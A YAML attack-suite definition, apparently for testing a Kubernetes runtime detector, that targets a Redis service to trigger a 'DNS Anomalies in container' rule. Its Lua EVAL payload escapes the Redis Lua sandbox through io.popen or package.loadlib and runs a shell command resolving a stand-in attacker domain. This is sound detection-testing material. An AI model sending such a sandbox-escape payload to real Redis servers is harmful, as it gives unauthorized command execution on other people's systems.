apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-attack-05-dns-anomaly
  description: "Resolve evil domain via getent hosts. Triggers R0005."
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis
attacks:
  - name: dns-anomaly-evil-domain
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        local f = io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done')
        local out = f:read('*a')
        f:close()
        return 'dns:' .. out
    successIndicators:
      - responseContains: "dns:"
expectedDetections:
  - attackType: fileless
    ruleID: R0005
    ruleName: "DNS Anomalies in container"
    containerName: redis
